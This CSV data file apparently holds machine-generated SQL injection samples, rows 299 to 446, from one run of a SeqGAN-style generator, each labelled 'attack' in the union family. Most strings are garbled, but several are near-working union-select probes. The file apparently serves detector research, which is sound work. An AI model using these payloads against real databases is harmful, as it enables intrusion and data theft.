label,payload,family,payload_type,method,run_id,sample_index
attack,"1-- --   ) or   )  )    )    )    union all all all all -- null,9814,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,299
attack,"-o1'    )     )     )   )    )   where)   where where union all all all select null#,8123,53491297,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,300
attack,"-43736075 selectnull,F#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,301
attack,"' union select ,,5756,2263,99211917e--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,302
attack,"-f4909)    union all 1' )   union null,3339,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,303
attack," 1  <where union all all select 2263,7497,null,9357--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,304
attack,"-6097''s where union ut io-- ,null,null,null,1297,3072,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,305
attack,"1')   union all uon   1646  1 union 8665 select 4854,null@5349,v@RSIO --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,306
attack,1'     )    )    )        union1-- select null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,307
attack,"-3997""   1249    where'  )    )    )    )   union 1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,308
attack,"-88126294union all select --,86657497--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,309
attack,"-""  )   )    )    union all all users where where null,7497,1980,4909,8665--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,310
attack,"--'') union all select ,null,7497,7497,9357,8986,3059#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,311
attack,1'   )  )    )    union all ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,312
attack,"-3997""where  1  =  =  4338union all all select 1494r -- us,versers,@@VRS1224s6667    @",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,313
attack,"-8073where all select ,1441,1646,,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,314
attack,"dall select null,null,null,null,null,9814,null,6737,null,null,null,null,%--,9988--,null,9814#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,315
attack,"-""  (   whereas  )    )    )    )    -- select null,4600,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,316
attack,-8268',union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,317
attack,"-""",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,318
attack,"-4338)    )    )    )    )#=  1 ho all select null,null,null,null,4481,,9814,4600,,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,319
attack,"-""%)    unionar union all all -- from us,vers$ussrs-- null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,320
attack,"-2190,3990--1134' selecte  s where  )     union all 9357,5349,6996,1249,9357,1441#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,321
attack,$ where   1 i,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,322
attack,"all union 9322,,9357,6996,1297#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,323
attack,"-399733783879 in  1 -- all all null--null,null,4600,null,null,null,null,null,8665,1441,9814--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,324
attack,"-2207""s'  )     )    )    )    )    union all select 1980,4481,--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,325
attack,"1e--""    )     )    )     )    )    )    a  )% union select null,null--,1249,4600,@,9357,8123,1441,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,326
attack,"-%''  ) union select null,9357,null---",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,327
attack,"-%""  ) union  select null,4600,--,null,null,null,null,null,null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,328
attack,"-6075"" union all 1,7845,2446,1297,1297,7845,5349,3990,-#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,329
attack,"---   )     )    )     )    )    )   where 1917n  where 2088  \)1 7815  ( union select null ,null,null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,330
attack,1v#,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,331
attack,"1)   )   union null,null--,null#--#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,332
attack,"-8073    )   )    )    2088  )    )    )   union select @93229110,1646#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,333
attack,"-5748 )   union all null,,null,null--,null,null,null,null,null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,334
attack,"-^""     )    )    )  a )    )    )    union all all select 1980,1297,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,335
attack,n'  )     )    )    )    uniont  (    )    )    union all all all where all null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,336
attack,"-6075 union all all all null,null,null,null,nullnull,null,null,null,null,null,null,null,null,null,null,null,null,null,4300,null,null,null,null,8986",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,337
attack,-3781',union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,338
attack,"-8073""t)    )   a)    )    union select ,null,1249,30842446,8986,7845,2446,2446,3084,null,null,3084,5756,1297,3084,null,2446--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,339
attack,"33702190 -- all all all null,4481,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,340
attack,"-5945'    )    )    a  )    )     )     )    )    )    union all ,2446,2263#,2446,--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,341
attack,"1'    )   )    ' union select 1917,null,4600--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,342
attack,"1'  a -- 1'e)    )   )    )    )   )    union null,null,null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,343
attack,"-)""'  )    union select null,v--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,344
attack,"-5575""""1 where  )    )    )    )    union all select null,null,null,null,3084#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,345
attack," 1'r  )     union all 1917  1,Nnull ,null,null,null,9814,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,346
attack,"-'+  (  select '55757531 where id  =  7815    union\5349-- all 1--,9357,null,null,null,null,null,null,null,,null,4481#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,347
attack,1 union union ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,348
attack,",null1#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,349
attack,-7531'  )    union all all all --,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,350
attack,"  1'   )    )   )    )    )    )    )   )    union select null,null,null,null,null,null,null,nullnull,null,nullu,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,351
attack,"-6996%'=-- iono select null us--ersersersersesersers where ussersnullserserssersers,6996,nullers,3990,1441,null1441,null,3084,2263,e,8986,2446,##",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,352
attack,"8308''    union select--  u,8986,5349',3084,7348----",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,353
attack,"1'   where union select null,null,null,null,4600,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,354
attack,"-,69963997""seunion  (   )    )    union 1   (    where union' 1i(   )    )    )    )    )  )    )    )    )    union all select from,3072,3480,8986,1249,3990,4909,4300,null--,1980--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,355
attack,"1   union   9517)    )    )   )   )    )     )    )'  )    union all all all all all all 1--e,null,null,9988",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,356
attack,"-6667%""')   union all 8890,1249,4909,5349,3990,,3072,9357,5756,e--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,357
attack,"-5575)   union all all null,@@VER)--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,358
attack,"1'  )   --ns""  )    ))",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,359
attack,"-8812""   union 1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,360
attack,"* * all select null,null,null,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,361
attack,4300-'+  (  select '%)   2285 where id  all all all all 2571r,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,362
attack,"-''  )   union select * from in  (   )  )    )    -- select null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,363
attack,"-4966'     union select 2446--select,9322--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,364
attack,"-5575% where union all all S,null,null,null,null,null,null,9814--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,365
attack,"-60751441,3116)    )    )    )   )    )   +  =  =  (=union all all all all select null,null,null,null,null,null,1441,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,366
attack,"-""  '1'  )    )    )    )     id  1 union all uo null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,367
attack,"-6294'  )    )  )    )    )     )    union all all all 3059,1297,,',1249,4481,,3059,7845,2446#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,368
attack,"-3370%''    )    )     )   -- all select -- ,	@=@",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,369
attack,"2446,1249,7497,3059--3378,6996,4909,null,3072,null,null,8123,4909,3084,3084'"",1249,9814,7348,1441#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,370
attack,"1)   )    $  (  =  1 union all all select null,null,null,null,null,4854,null,null,null,null,null,null,1917,8123--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,371
attack,"-'""   )    union all all select null,null,null#,8986,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,372
attack,"-""    )     )   )    a  t  )    )    where nullo null,,null,null,null,4481,null,@",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,373
attack,"1980,'1249    ))   )   )    )    )    union 1  (ON   1 whereed  )    union null,2263,39905756",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,374
attack,"-3116""s union select null,7497,1980,',null,null,8123#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,375
attack,"-p's'  )    )    )   )   union all select 1917,1441,null,null,null,null,null,null,3084,null,null,null--,null,3059,null,3084,5349,2446,null,1441,null,null,null,3339,null,null,1297,7845--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,376
attack,"8890'  )    )    union all all select null,null,3339,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,377
attack,"1' where id  =  =  2774   =i3339l i1  =  =  or where union all select null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,378
attack,"-3596'  (   -- all all select null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,379
attack,"-""    hs where  (s all select null,null,null,null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,380
attack," select 4481,2285,null,nullr",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,381
attack,"-8521""'  )   union all all select null,null,null,@@",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,382
attack,"1   )    )     )   union j,3480,3084,1297,7845,5756,null,8123#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,383
attack," select null,9110,3084,null,null,8123,null,null,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,384
attack,"1'     )    1646)   asunion u  =  1646,9988--4266s -- select null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,385
attack,"-sr    )'  us union all select null,null,null,1441,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,386
attack,"-1134'  )    union all all * -- where urs id1s where8665t  Rs union all all null,null,null,null,1441,null,null,null,null,null,null,null,null,2446,null,3339,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,387
attack,"1 union all ,7497,3990,4854,6737,2446--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,388
attack,"-Ds6996 union all all  select null,null,null,2446,null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,389
attack,6  ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,390
attack,"-4373) union all  select null,null,4909,4909,null,null,null,null,null,null,null,null,null,null,null--,null,9988,null,null,null,nullnull--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,391
attack,"932211   1  )    )     )    )   )    )   )    union 1 un  )   -- ors eid  (    )<)    )    )  )    )   union 1@1  =  (s u  9517  =o)   union all all all 9322,8986,4909,,4300,8123,null2263,8123,1297",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,392
attack,"-9860%'    )     )    )     )   Q  )    )    where where   =  =  (   union 2774,4600,3990,7497,2446,null,8665--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,393
attack,"-8073%'  )     )    )    )     )   union union 1,3990,7845,1249,--,5349,4909,7497",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,394
attack,1 18986)   )     )    union 1union 1,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,395
attack,"1'   )   )    )   )   )   union all select null,1297,9110--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,396
attack,"-"" union all select 9921,3990,null,8986,2446--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,397
attack,"1'""    )    )   )    )    )         union select all select 6737,7845,8986,4909",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,398
attack,"-q+8986')N union 1646 u  (   u  )    )   )    )     )    )    union all all from null,9814,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,399
attack,"1""    )   O all select 3339,null,null,null,null,null,3084,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,400
attack,"-se3997  )  7296 union all null,4909,8123,null,null,3059",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,401
attack,"%14418521' where id  =  7815 use i1  = union select null,2263,4481,null,null,null,4300",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,402
attack,"1'% id  )    '$  )where union select@VEERSIrON union select null,9110,1224,3084--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,403
attack,"-3370 )    )   union all from null,4909,null,null,null,null,null,null,null,null,null,null,null,null,null,null,2285,null,null,null,null,3084,null,null,9357,null,null,null,null,4300,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,404
attack,"-5575"" where union 18986'  (O7497)   )    )   union all where 8890,2263",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,405
attack," idall select  where where @ i,7497,null,null,null,null,4481,null,null--9921",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,406
attack,-4205' union all 1980  =  (    )    union all 1,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,407
attack,"1 all select null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,408
attack,"1')    )  )   union * select * @2774RVER98601 where  )     )   )    )    )     )     union u  select ,null,null,null,6996",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,409
attack,-%'  )    2774)    union from all from null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,410
attack,"-(J49666667'   select null,1917where --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,411
attack,-6294'    )   ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,412
attack,"-6097''  )    )      )     )   )    )   union all where null,1249,,3059,5349,vall,8986,7845,1441,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,413
attack,"1'  )    union 1980  =  =  =  =  =  11 i=    =  1bs gunion select,4300,3072,1441,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,414
attack,2207s  8268  1 union all all * null1980sers --,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,415
attack,"1'se)    )    )   union select null,null,null,null,3480,null,null,null,null,null,nulle#--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,416
attack,"-3116'  )   union  4300 select 74973480,8665,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,417
attack,"1'  )    )     )    )    )    )    +union \f4266$,7497,9357,3480,3072,4909,7845,3072--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,418
attack,"1""    )    )    )    )     )   )    union all users'ers us Sussers id  =  (    )    )    -- select null,null#,9357,9357",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,419
attack,"-1894   )   where union all l-- ,select 4909,4909,7497",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,420
attack,"-s' union select null--,null,8123,5349,null,3072,5349",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,421
attack,"-3084%'     union u .  )   )   )    )    )    )    )   union all where null,8123,9357,2446,1249--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,422
attack," select null,null,3084--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,423
attack,"-')    union all all null,null,null,null,--,null --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,424
attack,"-8123'   )    union "".  )     )    )    )     )    )    )    )    )O  )2571  V  '+  (  select 'select ,null,null,null,null,null,null,null,#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,425
attack,"-)  )    union * * 1494  )    ),)    union ",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,426
attack,"1'    5575s' )    )    a   ""    )    )   union-- 1,3084,) union from)    -- all all null,null,3990,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,427
attack,"-""%'  )    )   2571'",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,428
attack,"-9156%'    )    )    )   union all fromhsersrsers where 2285  )    ,3990,1249",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,429
attack,".'  1 union null,4600,8665,2263,1441,3059,3084,null,1646,3072,4854,1646,1646",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,430
attack,"17296'    )    )    )  )  )    )     )     union all \as,vrsers where users   usrsers id  1) where  )i)    )   a  (   O    =  )    )    union all all all alle--$""",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,431
attack,-6667% union union all all all ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,432
attack,"-  select 1sers 8890,9814e,v --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,433
attack,"-'  1)    )    union all null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5756,null,null,null,null,null,null,null,null,nnull#,3084",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,434
attack,"-%' where i  select 1917,null,4600--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,435
attack,"-'s union select null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,436
attack,"-3072""   )    )    )  )=    2088  1134 union select 4481,1297,null,,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,437
attack,"1441%""   )    asers  )     )   union all all ,2446,4300,1297--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,438
attack,"  =  =  1 u  =1 1917=  1 union all . 2285 --,null--1441,3084,4300,null,7348,null,3339,null,null,null,null,null,null,null,null,4600,--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,439
attack,"-6097'   )    )    )  union where .  )    )    ) union all all select null,4909,1646,null,null,null,null,@@--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,440
attack,"-3370""   )    )     )    )     )   union  1--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,441
attack," all null,null,3990--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,442
attack,  1 all all select * null#,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,443
attack,"-4205'    ,3072'  1   )    )    union from all all 9322,7497,,,9357,null,7497,4600,6737#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,444
attack,"-3378""   )    )    )    )  )    )     )    vid  =  1 +$ 9517 all select  u,null,7497,null,null,null,9814,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,445
attack,"-dt union select 9110,3339,null,2263#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,446
